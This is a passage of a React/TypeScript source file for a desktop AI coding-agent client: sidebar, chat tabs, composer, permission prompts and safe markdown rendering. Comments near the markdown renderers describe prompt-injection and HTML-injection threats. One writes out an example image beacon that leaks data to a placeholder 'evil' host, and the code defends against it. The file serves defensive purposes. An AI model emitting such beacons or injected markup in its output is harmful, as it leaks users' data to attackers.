            <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z" />
          </svg>
        </button>
        <button
          className="tasks-toggle"
          onClick={() => setTasksOpen(true)}
          title="Tasks"
          aria-label="Open tasks"
        >
          <svg
            width="15"
            height="15"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            aria-hidden="true"
          >
            <path d="M9 11l3 3L22 4" />
            <path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11" />
          </svg>
        </button>
      </div>
      {banner}
      <div className="shell-body">
        <aside className={`sidebar${sidebarOpen ? "" : " collapsed"}`}>
          <div className="sidebar-head">
            <div className="sidebar-brand">
              <span className="mark" />
              <strong>Grok Build</strong>
            </div>
            {/* No project, no "New chat": there's no folder for it to be in yet.
                "Open folder…" is the one thing a launcher can do. */}
            {projectCwd && (
              <button className="new-chat primary" onClick={() => addRun()}>
                New chat
              </button>
            )}
            <button
              className="open-folder ghost"
              onClick={() => pickProject()}
              title={projectCwd ? "Open another project in its own window" : "Open a project folder"}
            >
              Open folder…
            </button>
          </div>
          <input
            ref={searchInputRef}
            className="side-search"
            type="search"
            value={historyQuery}
            onChange={(event) => setHistoryQuery(event.currentTarget.value)}
            placeholder="Search conversations"
            aria-label="Search conversations"
          />
          <div className="side-list">
            {/* Above the list, not inside the empty-state branch: a broken content
                search still leaves the local title matches standing, and those are
                the deceptive case — a short list that looks like the whole answer. */}
            {historySearchError && <div className="side-state error">{historySearchError}</div>}
            {historyLoading && historySessions.length === 0 && (
              <div className="side-state">Loading conversations…</div>
            )}
            {!historyLoading && historyListError && <div className="side-state error">{historyListError}</div>}
            {(!historyLoading || historySessions.length > 0) &&
              !historyListError &&
              filteredSessions.length === 0 && (
                <div className="side-state">
                  {query
                    ? historySearching
                      ? "Searching…"
                      : // When content search couldn't run, only titles were actually
                        // searched — so that is all we may claim. Saying "No matches"
                        // here would be a statement about conversation contents that
                        // nothing ever looked at.
                        historySearchError
                        ? "No title matches"
                        : "No matches"
                    : // An empty project is not a broken list. Rust answers a cwd
                      // it has no sessions for with an empty list, not an error,
                      // so the two must not read the same.
                      projectCwd
                      ? "No conversations in this project yet"
                      : "No conversations yet"}
                </div>
              )}
            {(!historyLoading || historySessions.length > 0) &&
              !historyListError &&
              filteredSessions.map(({ session, snippet }) => {
                const isActive = activeSessionId === session.id;
                const isOpen = openIds.has(session.id);
                return (
                  <button
                    key={session.id}
                    className={`side-row${isActive ? " active" : ""}`}
                    onClick={() => void openConversationFromSidebar(session)}
                    title={session.cwd}
                    aria-current={isActive ? "page" : undefined}
                  >
                    <strong>{session.title || "Untitled conversation"}</strong>
                    {/* Why this row is here. Without it a content search is a wall of
                        identical "Untitled conversation" rows — 33 of 50 conversations
                        have no title — with nothing to tell them apart. One line, clipped:
                        this is a scent, not a preview. */}
                    {snippet && (
                      <span className="side-row-snippet">
                        {splitSnippet(snippet).map((part, index) =>
                          part.mark ? (
                            <mark key={index}>{part.text}</mark>
                          ) : (
                            <span key={index}>{part.text}</span>
                          ),
                        )}
                      </span>
                    )}
                    <span className="side-row-meta">
                      {/* The folder only earns its space in a launcher, where the
                          list spans every project. In a project window it's the
                          same word on every row. */}
                      {!projectCwd && `${folderName(session.cwd)} · `}
                      {/* Open-but-not-active is worth saying: clicking it switches
                          tabs rather than loading anything. The active one already
                          says so by being highlighted. */}
                      {isOpen && !isActive && "Open · "}
                      {sessionDate(session.updated_at)}
                    </span>
                  </button>
                );
              })}
          </div>
        </aside>

        <main className="content">
          {dragging && stage === "chat" && activeTab?.cwd && (
            <div className="drop-overlay">Drop files to attach</div>
          )}
          {!projectCwd ? (
            <div className="content-empty">
              <h1>Open a folder to start</h1>
              <p>Each project gets its own window. Pick one, or open a conversation on the left.</p>
              <button className="primary" onClick={() => pickProject()} disabled={openingProject}>
                Choose a folder…
              </button>
              <Progress line={openingProject ? "Opening your project…" : null} />
              {recents.length > 0 && (
                <div className="recents">
                  <div className="recents-head">Recent</div>
                  {recents.map((p) => (
                    <button key={p.path} className="recent" onClick={() => openRecent(p.path)} title={p.path}>
                      <strong>{p.name}</strong>
                      <span>{p.path}</span>
                    </button>
                  ))}
                </div>
              )}
              {notice && <p className="notice error">{notice}</p>}
            </div>
          ) : tabs.length > 0 ? (
            <>
              <nav className="tab-strip" aria-label="Chat tabs">
                {tabs.map((tab) => (
                  <div className={`chat-tab${tab.id === activeTabId ? " active" : ""}`} key={tab.id}>
                    <button
                      className="tab-select"
                      onClick={() => setActiveTabId(tab.id)}
                      aria-current={tab.id === activeTabId ? "page" : undefined}
                      title={tab.title ?? "New chat"}
                    >
                      {tab.title ?? "New chat"}
                    </button>
                    <button
                      className="tab-close"
                      onClick={() => closeTab(tab.id)}
                      aria-label={`Close ${tab.title ?? "new chat"}`}
                      title="Close tab"
                    >
                      ×
                    </button>
                  </div>
                ))}
                <button
                  className="tab-add"
                  onClick={() => addRun()}
                  aria-label="New conversation"
                  title="New conversation"
                >
                  +
                </button>
              </nav>

              {/* Window-level failures — an "Open folder…" that Rust refused. A
                  tab's own error renders on the tab; this one belongs to no tab,
                  and before it was rendered here it failed silently. */}
              {notice && <p className="notice error">{notice}</p>}

              {activeTab?.needsAuth ? (
                <div className="content-empty tab-auth">
                  <h1>Sign in to continue</h1>
                  <p>Grok needs you signed in before it can work on this project.</p>
                  {activeTab.authMethods.map((method) => (
                    <button
                      key={method.id}
                      className="primary"
                      onClick={() => signIn(activeTab, method.id)}
                      disabled={Boolean(activeTab.authPending)}
                    >
                      {method.description ?? `Sign in with ${method.name}`}
                    </button>
                  ))}
                  <Progress
                    line={authLine(activeTab)}
                    onCancel={
                      activeTab.authPending === "browser"
                        ? () => cancelSignIn(activeTab.id)
                        : activeTab.authPending === "opening" && activeTab.connectShowCancel
                          ? () => void cancelRun(activeTab.id).catch(() => {})
                          : undefined
                    }
                  />
                  {activeTab.error && <p className="notice error">{activeTab.error}</p>}
                </div>
              ) : activeTab ? (
                <>
                  <header className="bar">
                    {/* The full path is the answer to "does it actually know where it's working?" */}
                    <div className="folder" title={activeTab.cwd}>
                      <span className="dot" />
                      <strong>{folderName(activeTab.cwd)}</strong>
                      <span className="path">{activeTab.cwd}</span>
                    </div>
                    <div className="bar-actions">
                      {activeTab.usageTokens > 0 && (
                        <span className="usage-total">· {activeTab.usageTokens.toLocaleString()} tokens</span>
                      )}
                      <button className="ghost" onClick={() => closeTab(activeTab.id)}>
                        Close tab
                      </button>
                    </div>
                  </header>

                  <div className="stream" ref={scrollRef}>
                    {activeTab.items.length === 0 && (
                      <div className="empty">
                        <p>
                          Grok can read and edit everything in <strong>{folderName(activeTab.cwd)}</strong>. Tell it
                          what you want done, in plain English.
                        </p>
                        <p className="eg">e.g. “add a README explaining what this project does”</p>
                        <div className="starter-chips">
                          {STARTERS.map((starter) => (
                            <button
                              type="button"
                              className="starter-chip"
                              key={starter}
                              onClick={() => {
                                updateActiveTab((tab) => ({ ...tab, draft: starter }));
                                requestAnimationFrame(() => textareaRef.current?.focus());
                              }}
                            >
                              {starter}
                            </button>
                          ))}
                        </div>
                        {/* Be straight about this: Grok's agent mode applies edits itself. */}
                        <p className="eg warn">
                          Grok can change files here on its own. Use a folder you can undo — ideally one in git.
                        </p>
                      </div>
                    )}
                    <TranscriptItems
                      items={activeTab.items}
                      streamingId={streamingId}
                      onDecide={(item, optionId, label) => decide(activeTab, item, optionId, label)}
                      onEditMessage={(text) => {
                        updateActiveTab((tab) => ({ ...tab, draft: text }));
                        requestAnimationFrame(() => textareaRef.current?.focus());
                      }}
                      onRewindMessage={(item) => {
                        if (activeTab) void openRewind(activeTab, item);
                      }}
                    />
                    {activeTab.busy && (
                      <div className="working">
                        <span />
                        <span />
                        <span />
                      </div>
                    )}
                    {/* A tab that already has a cwd can still be reconnecting —
                        "Open folder…" on an open tab lands here, not in the
                        empty state. */}
                    <Progress
                      line={connectLineFor(activeTab)}
                      onCancel={
                        activeTab.connectShowCancel
                          ? () => void cancelRun(activeTab.id).catch(() => {})
                          : undefined
                      }
                    />
                  </div>

                  <form
                    className="composer"
                    onSubmit={(e) => {
                      e.preventDefault();
                      submit();
                    }}
                  >
                    {activeTab.attachments.length > 0 && (
                      <div className="attachments" aria-label="Attached files">
                        {activeTab.attachments.map((attachment) => (
                          <span
                            className="attachment-chip"
                            key={attachment}
                            title={
                              isImagePath(attachment)
                                ? "Grok can't view images yet — it'll see the path only"
                                : attachment
                            }
                          >
                            <span className="attachment-name">{folderName(attachment)}</span>
                            <button
                              type="button"
                              onClick={() =>
                                updateActiveTab((tab) => ({
                                  ...tab,
                                  attachments: tab.attachments.filter((path) => path !== attachment),
                                }))
                              }
                              aria-label={`Remove ${folderName(attachment)}`}
                            >
                              ×
                            </button>
                          </span>
                        ))}
                      </div>
                    )}
                    <Autocomplete items={visibleAcItems} activeIndex={acIndex} onPick={applyAcPick} />
                    <textarea
                      ref={textareaRef}
                      value={activeTab.draft}
                      onChange={(e) => {
                        const draft = e.currentTarget.value;
                        updateActiveTab((tab) => ({ ...tab, draft }));
                        setComposerCaret(e.currentTarget.selectionStart ?? draft.length);
                      }}
                      onSelect={(e) => setComposerCaret(e.currentTarget.selectionStart ?? 0)}
                      onClick={(e) => setComposerCaret(e.currentTarget.selectionStart ?? 0)}
                      onKeyUp={(e) => setComposerCaret(e.currentTarget.selectionStart ?? 0)}
                      onKeyDown={(e) => {
                        // The "/" and "@" dropdown gets first refusal on these keys —
                        // ONLY while it actually has items showing — before falling
                        // through to the ordinary Enter-submits behavior below.
                        if (visibleAcItems.length > 0) {
                          if (e.key === "ArrowDown") {
                            e.preventDefault();
                            setAcIndex((i) => (i + 1) % visibleAcItems.length);
                            return;
                          }
                          if (e.key === "ArrowUp") {
                            e.preventDefault();
                            setAcIndex((i) => (i - 1 + visibleAcItems.length) % visibleAcItems.length);
                            return;
                          }
                          if (e.key === "Enter" || e.key === "Tab") {
                            e.preventDefault();
                            applyAcPick(visibleAcItems[acIndex] ?? visibleAcItems[0]);
                            return;
                          }
                          if (e.key === "Escape") {
                            e.preventDefault();
                            setAcDismissed(true);
                            return;
                          }
                        }
                        if (e.key === "Enter" && !e.shiftKey) {
                          e.preventDefault();
                          submit();
                        }
                      }}
                      placeholder="What should Grok do?"
                      rows={1}
                    />
                    <button
                      type="submit"
                      className="primary"
                      disabled={
                        activeTab.busy || (!activeTab.draft.trim() && activeTab.attachments.length === 0)
                      }
                    >
                      {activeTab.busy ? "Working…" : "Send"}
                    </button>
                  </form>
                </>
              ) : null}
            </>
          ) : (
            // A project window whose tabs have all been closed. It keeps the
            // folder — closing a conversation isn't letting go of the project —
            // so this is one button, not the picker over again.
            <div className="content-empty">
              <h1>Nothing open in {folderName(projectCwd)}</h1>
              <p>Start a new conversation, or pick one from the left.</p>
              <button className="primary" onClick={() => addRun()}>
                New chat
              </button>
              {notice && <p className="notice error">{notice}</p>}
            </div>
          )}
        </main>
      </div>
      <CommandPalette open={paletteOpen} actions={paletteActions} onClose={() => setPaletteOpen(false)} />
      <Preferences
        open={prefsOpen}
        onClose={() => setPrefsOpen(false)}
        theme={theme}
        onThemeChange={setTheme}
        sessionInfo={activeTab?.sessionInfo}
        effortCommandAvailable={effortCommandAvailable}
        onSetEffort={onSetEffort}
        shortcuts={prefsShortcuts}
        cliPath={authInfo?.grok_path ?? null}
        cliVersion={cliVersion}
        hasLogin={authInfo?.has_login}
        onCheckUpdates={() => void askUpdate()}
        readonlyTools={readonlyToolsList}
      />
      <RewindPanel
        open={rewindOpen}
        onClose={() => setRewindOpen(false)}
        points={rewindPointsList}
        loading={rewindLoading}
        error={rewindError}
        focusPointId={rewindFocusId}
        onConfirm={(pointId, mode) => void confirmRewind(pointId, mode)}
      />
      <TasksPanel open={tasksOpen} onClose={() => setTasksOpen(false)} tasks={activeTab?.tasks ?? []} />
      <ReceiptPanel
        open={receiptOpen}
        onClose={() => setReceiptOpen(false)}
        items={activeTab?.items ?? []}
        sessionInfo={activeTab?.sessionInfo}
        title={activeTab?.title ?? undefined}
        cwd={activeTab?.cwd}
      />
    </div>
  );
}

/// A link in agent-written markdown. Two things have to be true here.
///
/// It must not navigate the webview: this window has no back button and no chrome,
/// so a click that replaced the app with someone's web page would strand the user
/// in it with no way back. `preventDefault` plus the opener plugin sends it to the
/// real browser instead, which is the only place a web page belongs.
///
/// And only ever an http(s) URL. markdown-to-jsx's built-in sanitizer already drops
/// `javascript:` and `data:` hrefs (they arrive here as `undefined`), so this
/// allowlist is the second lock, not the first — `openUrl` hands its argument to
/// the OS, and the OS will happily act on schemes a browser never would.
function MarkdownLink({ href, children }: { href?: string; children?: React.ReactNode }) {
  const url = typeof href === "string" && /^https?:\/\//i.test(href) ? href : null;
  // A link the sanitizer gutted still reads as text, but it must not dress up as
  // something clickable that then does nothing.
  if (!url) return <span className="md-dead-link">{children}</span>;
  return (
    <a
      href={url}
      target="_blank"
      rel="noreferrer noopener"
      onClick={(event) => {
        event.preventDefault();
        void openUrl(url).catch(() => {});
      }}
    >
      {children}
    </a>
  );
}

/// A markdown table is the one block that can't be made to fit: its width is its
/// content's. Wrapping it lets it scroll in its own box rather than push the
/// bubble past the 72ch the rest of the transcript is measured to.
function MarkdownTable({ children }: { children?: React.ReactNode }) {
  return (
    <div className="md-scroll">
      <table>{children}</table>
    </div>
  );
}

/// Grok's output is untrusted: it routinely echoes file contents back, and a file
/// can hold `<script>` or `<img onerror=…>`. This webview can invoke commands that
/// touch the filesystem and spawn processes, so rendering that HTML would be remote
/// code execution, not a defaced page. `tauri.conf.json` does ship a strict CSP
/// (`script-src 'self'`, `img-src 'self'`, …), but that only stops script execution and
/// remote fetches — it does nothing about `<base>`/`<form>` repointing the app's own
/// relative URLs, so the CSP is the second net, not the first.
///
/// `disableParsingRawHTML` is the first net: raw HTML is escaped to text
/// instead of being transcribed into elements. It is load-bearing and not
/// belt-and-braces — with it off, `<base href>` and `<form action>` in agent output
/// render as live elements, and a `<base>` tag silently repoints every relative URL
/// in the app. Nothing here ever reaches `dangerouslySetInnerHTML`: markdown-to-jsx
/// compiles to a React element tree and produces no HTML string at any point.

/// The agent's markdown is untrusted: it echoes file contents, and a file can carry
/// a prompt injection. An `<img>` fetches its src the instant it renders, with no
/// click, so `![](https://evil/?leak=<whatever the agent just read>)` is a working
/// exfiltration beacon — the request itself is the payload. The CSP's `img-src 'self'`
/// blocks the fetch, but a CSP is one regression away from silence, and a blocked
/// image still renders as a broken-image box that says nothing about why.
///
/// So remote images never become an `<img>` at all. Grok can't see images anyway
/// (`promptCapabilities.image` is false), so a remote one in its output is either a
/// hallucinated URL or an attack; neither deserves a network request.
function MarkdownImage({ alt, src }: { alt?: string; src?: string }) {
  const label = (alt ?? "").trim();
  return <span className="md-dead-link">{label ? `image: ${label}` : "image"}{src ? "" : ""}</span>;
}

/// Fenced code blocks compile to `<pre><code class="lang-xxx">…</code></pre>`; this
/// overrides the outer `pre` only, so inline `` `code` `` (no fence, no `pre` wrapper)
/// keeps markdown-to-jsx's plain default rendering untouched. The code text and
/// language both live on the child `<code>` element that markdown-to-jsx already
/// built — we're pulling them back out, not re-parsing the markdown ourselves.
function MarkdownPre({ children }: { children?: React.ReactNode }) {
  const codeEl = Array.isArray(children) ? children[0] : children;
  if (
    !codeEl ||
    typeof codeEl !== "object" ||
    !("props" in codeEl) ||
    typeof (codeEl as { props?: { children?: unknown; className?: unknown } }).props !== "object"
  ) {
    // Not the shape we expect (defensive only — markdown-to-jsx always nests a
    // `code` here for a fenced block): fall back to a plain, safe `pre`.
    return <pre>{children}</pre>;
  }
  const props = (codeEl as { props: { children?: unknown; className?: string } }).props;
  const code = Array.isArray(props.children) ? props.children.join("") : String(props.children ?? "");
  const match = /(?:^|\s)lang-(\S+)/.exec(props.className ?? "");
  return <CodeBlock code={code} lang={match?.[1]} />;
}

const MARKDOWN_OPTIONS = {
  disableParsingRawHTML: true,
  // Without this a one-line answer compiles to a bare inline span, so the same
  // message would be spaced differently depending on its length.
  forceBlock: true,
  overrides: { a: MarkdownLink, table: MarkdownTable, img: MarkdownImage, pre: MarkdownPre },
} as const;

/// Memoized on `text` alone, which is what keeps streaming from going quadratic.
/// `reduceUpdates`/`appendText` rebuild only the bubble being appended to and leave
/// every earlier item referentially identical, so a chunk arriving on the open
/// bubble re-parses that one message and every finished message above it bails out
/// here instead of re-parsing on every keystroke of the stream.
export const MarkdownText = memo(function MarkdownText({ text }: { text: string }) {
  return <Markdown options={MARKDOWN_OPTIONS}>{text}</Markdown>;
});

/// Markdown is the agent's own idiom, so it renders for the agent's own words:
/// `answer` and `thought` alike — the same model emits the same syntax in both, and
/// leaving thoughts raw would show literal `**` in exactly the place the fix was
/// asked for. `you` stays verbatim: the user didn't write markdown, and quietly
/// reinterpreting their text is a small lie about what they typed. `error` stays
/// verbatim too — it's backend text and must not be reformatted or swallowed.
const RENDERS_MARKDOWN: ReadonlySet<TextItem["kind"]> = new Set(["answer", "thought"]);

/// Bubbles that get a hover action row (copy, and — for the user's own words — edit).
/// Thoughts and errors are backend/model narration, not something the user authored
/// or would want to paste back into the composer, so they stay bare.
const HAS_ACTIONS: ReadonlySet<TextItem["kind"]> = new Set(["answer", "you"]);

function TranscriptItems({
  items,
  streamingId,
  onDecide,
  onEditMessage,
  onRewindMessage,
}: {
  items: Item[];
  /// The id of the answer bubble currently streaming, or null. Only decides whether this
  /// bubble wears the live caret — a class add, never a change to its entrance animation.
  streamingId?: string | null;
  onDecide?: (i: AskItem, optionId: string | null, label: string) => void;
  /// Loads a past "you" message's text back into the composer draft for editing and
  /// resending as a new turn. Never mutates or truncates history.
  onEditMessage?: (text: string) => void;
  /// Opens the Rewind panel anchored at this "you" message. Never mutates or
  /// truncates history itself — the panel/App own fetching points and
  /// executing the restore.
  onRewindMessage?: (item: TextItem) => void;
}) {
  return items.map((item) => {
    if (isTool(item)) {
      return <ToolCard key={item.id} item={item} />;
    }
    if (isAsk(item)) return <PermissionCard key={item.id} item={item} onDecide={onDecide} />;
    if (isPlan(item)) return <PlanCard key={item.id} entries={item.entries} />;
    if (isUsage(item)) return <UsageLine key={item.id} item={item} />;
    const markdown = RENDERS_MARKDOWN.has(item.kind);
    const streaming = item.id === streamingId ? " streaming" : "";
    const bubbleClass = `bubble ${item.kind}${markdown ? " md" : ""}${streaming}`;
    const content = markdown ? <MarkdownText text={item.text} /> : item.text;
    // Only answer/you bubbles get the hover action row, and only once they've settled
    // (not mid-stream) — wrapping stays scoped to those so thought/error bubbles keep
    // rendering as the direct `.stream` child the existing CSS selectors expect.
    if (HAS_ACTIONS.has(item.kind) && item.id !== streamingId) {
      return (
        <div key={item.id} className="bubble-wrap">
          <div className={bubbleClass}>{content}</div>
          <MessageActions
            text={item.text}
            onEdit={item.kind === "you" ? () => onEditMessage?.(item.text) : undefined}
            onRewind={item.kind === "you" ? () => onRewindMessage?.(item) : undefined}
          />
        </div>
      );
    }
    return (
      <div key={item.id} className={bubbleClass}>
        {content}
      </div>
    );
  });
}

function UsageLine({ item }: { item: UsageItem }) {
  const durationSec = isFiniteNumber(item.apiDurationMs) && item.apiDurationMs > 0
    ? (item.apiDurationMs / 1000).toFixed(1)
    : null;
  const tokens = isFiniteNumber(item.totalTokens) && item.totalTokens > 0 ? item.totalTokens : 0;

  return (
    <div className="turn-receipt">
      <span className="turn-receipt-done">Done</span>
      {durationSec !== null && (
        <>
          <span className="turn-receipt-sep" />
          <span className="turn-receipt-stat">
            <span className="turn-receipt-stat-val">{durationSec}</span>s
          </span>
        </>
      )}
      {tokens > 0 && (
        <>
          <span className="turn-receipt-sep" />
          <span className="turn-receipt-stat">
            <span className="turn-receipt-stat-val">{formatTokens(tokens)}</span> tokens
          </span>
        </>
      )}
    </div>
  );
}

function formatTokens(tokens: number): string {
  return tokens >= 1_000 ? `${(tokens / 1_000).toFixed(1).replace(/\.0$/, "")}k` : String(tokens);
}

/// The gate. Our PreToolUse hook holds Grok's tool call open until the user
/// answers here, so an approved edit is the only one that lands. Best-effort, not
/// a hard boundary: grok's hook runner fails open if approval times out or errors.
function PermissionCard({
  item,
  onDecide,
}: {
  item: AskItem;
  onDecide?: (i: AskItem, optionId: string | null, label: string) => void;
}) {
  const { toolCall, options } = item.req;
  const content = toolCall?.content ?? [];
  const diffs = content.filter((c) => c.type === "diff");
  const commands = content.filter((c) => c.type === "command");

  if (item.decided) {
    return (
      <div className="ask decided">
        <span className="tick" />
        {item.decided} — {toolCall?.title ?? "change"}
      </div>
    );
  }

  // The answer didn't land, so this must not wear the decided card's tick. The
  // buttons go too: the request is spent, and offering them again would only
  // produce the same rejection.
  if (item.failed) {
    return (
      <div className="ask">
        <div className="ask-head">{toolCall?.title ?? "Grok wants to make a change"}</div>
        <p className="notice error">{item.failed}</p>
      </div>
    );
  }

  return (
    <div className="ask">
      <div className="ask-head">{toolCall?.title ?? "Grok wants to make a change"}</div>
      {diffs.map((d, n) => (
        <div className="diff" key={`d${n}`}>
          {d.path && <div className="diff-path">{d.path}</div>}
          <SplitDiff oldText={d.oldText ?? ""} newText={d.newText ?? ""} />
        </div>
      ))}
      {commands.map((c, n) => (
        <pre className="diff-body cmd" key={`c${n}`}>
          {c.text ?? ""}
        </pre>
      ))}
      {onDecide && (
        <div className="ask-actions">
          {options.map((o) => (
            <button
              key={o.optionId}
              className={String(o.kind).startsWith("allow") ? "primary" : ""}
              onClick={() => onDecide(item, o.optionId, o.name)}
            >
              {o.name}
            </button>
          ))}
        </div>
      )}
    </div>
  );
}

/// The agent's running plan for the turn. Grok resends the whole list as steps
/// move to in_progress/completed; we render the latest state in place.
function PlanCard({ entries }: { entries: PlanItem["entries"] }) {
  if (!entries.length) return null;
  return (
    <div className="plan">
      <div className="plan-head">Plan</div>
      <ol className="plan-list">
        {entries.map((e, n) => (
          <li key={n} className={`plan-step ${e.status ?? ""}`}>
            {e.content}
          </li>
        ))}
      </ol>
    </div>
  );
}


function Splash({
  title,
  line,
  children,
  banner,
}: {
  title: string;
  line: string;
  children?: React.ReactNode;
  banner?: React.ReactNode;
}) {
  return (
    <main className="splash">
      {/* Same drag handle as the shell — the overlay titlebar means even the splash needs
          its own way to move the window. Absolute so it doesn't shift the centered content. */}
      <div className="titlebar titlebar-float" data-tauri-drag-region />
      {banner}
      <div className="mark" />
      <h1>{title}</h1>
      <p>{line}</p>
      {children}
    </main>
  );
}

/// The app's only progress surface: the existing `.working` pulse over a live
/// status line. Indeterminate on purpose — nothing we wait on (a sign-in a human
/// is doing in a browser, an installer that never reports a total, a handshake)
/// has an honestly knowable end, so there is no bar and no percentage to show.
///
/// Hosts mount this unconditionally and toggle `line` instead: a `role="status"`
/// region inserted into the DOM already populated is generally not announced, so
/// mounting-on-demand would silently cost us the announcement. `detail` is
/// verbatim backend text and stays `aria-hidden` — the coarse line alone is worth
/// interrupting someone for, and `role="status"` implies `aria-atomic`.
function Progress({
  line,
  detail,
  error,
  onCancel,
}: {
  line: string | null;
  detail?: string | null;
  error?: boolean;
  onCancel?: () => void;
}) {
  return (
    <div className="progress" role="status" aria-live="polite">
      {/* Nothing is in flight once it has failed, so the pulse stops with it. */}
      {line && !error && (
        <div className="working">
          <span />
          <span />
          <span />
        </div>
      )}
      {line && <p className={error ? "notice error" : "notice"}>{line}</p>}
      {line && detail && (
        <p className="progress-detail" aria-hidden="true">
          {detail}
        </p>
      )}
      {line && onCancel && (
        <button className="ghost" onClick={onCancel}>
          Cancel
        </button>
      )}
    </div>
  );
}

/// Shown on every screen when a newer release exists — it's app-global truth, and
/// it stays per-window because it's true in every window. Opt-in, never automatic.
///
/// The confirm lives in the banner rather than in a dialog: it's one sentence and
/// two buttons, and it's the same surface the user just pressed, so it doesn't
/// take over the screen to say the restart will stop what's running.
function UpdateBanner({
  update,
  busy,
  gate,
  onAsk,
  onConfirm,
  onCancel,
}: {
  update: Update;
  busy: boolean;
  gate: { busy: number | null } | null;
  onAsk: () => void;
  onConfirm: () => void;
  onCancel: () => void;
}) {
  if (gate) {
    return (
      <div className="update">
        <span>
          {gate.busy === null
            ? // We couldn't count them, so we don't name a number.
              "Updating restarts the app and stops anything still running."
            : `Updating stops ${gate.busy} running ${
                gate.busy === 1 ? "conversation" : "conversations"
              } and restarts the app.`}
        </span>
        <button onClick={onConfirm} disabled={busy}>
          {busy ? "Updating…" : "Update anyway"}
        </button>
        <button onClick={onCancel} disabled={busy}>
          Not now
        </button>
      </div>
    );
  }

  return (
    <div className="update">
      <span>Version {update.version} is available.</span>
      <button onClick={onAsk} disabled={busy}>
        {busy ? "Updating…" : "Update & restart"}
      </button>
    </div>
  );
}
